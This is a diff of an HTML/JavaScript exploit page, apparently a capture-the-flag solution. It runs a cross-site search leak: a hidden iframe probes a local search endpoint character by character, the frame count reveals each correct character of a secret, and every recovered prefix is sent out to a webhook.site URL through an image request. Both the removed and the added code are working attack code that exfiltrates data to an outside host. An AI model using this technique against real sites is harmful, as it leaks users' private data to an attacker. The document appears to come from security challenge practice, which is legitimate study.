@@ -1,28 +1,42 @@
-<script>
-(async () => {
-    let currentB64 = "REh7";
-    let flag = atob(currentB64); 
-    
-    const webhook = "https://webhook.site/bb5035c7-26ff-4343-a7fb-1bcd6549ad8f";
-    const iframe = document.createElement("iframe");
-    
-    iframe.style.display = "none";
-    document.body.appendChild(iframe);
+<iframe id="iframe" style="display:none"></iframe>
+<img id="img" style="display:none">
 
-    while (!flag.includes("}")) {
-        for (let c of "0123456789abcdef}") {
-            await new Promise(resolve => {
-                iframe.onload = () => {
-                    if (iframe.contentWindow.frames.length > 0) {
-                        flag += c;
-                        new Image().src = `${webhook}?d=${btoa(flag)}`;
-                    }
-                    resolve();
-                };
-                iframe.src = `http://127.0.0.1:8000/search?query=${flag}${c}`;
-            });
-            if (flag.endsWith(c)) break;
+<script>
+    async function req(url) {
+        return await new Promise((resolve, reject) => {
+            const iframe = document.getElementById("iframe");
+            iframe.onload = () => {
+                if(iframe.contentWindow.frames.length == 1) resolve();
+                else reject();
+            };
+            iframe.src = url;
+        });
+    }
+
+    async function search(query) {
+        try {
+            await req(`http://127.0.0.1:8000/search?query=${query}`);
+            return true;
+        } catch (e) {
+            return false;
         }
     }
-})();
+
+    async function exploit() {
+        let currentB64 = "REh7";
+        
+        let flag = atob(currentB64);
+        const webhook = "https://webhook.site/bb5035c7-26ff-4343-a7fb-1bcd6549ad8f";
+
+        while(!flag.includes("}")) {
+            for(let c of "0123456789abcdef}") {
+                if(await search(flag + c)) {
+                    flag += c;
+                    document.getElementById("img").src = `${webhook}?d=${btoa(flag)}`;
+                    break; 
+                }
+            }
+        }
+    }
+    exploit();
 </script>
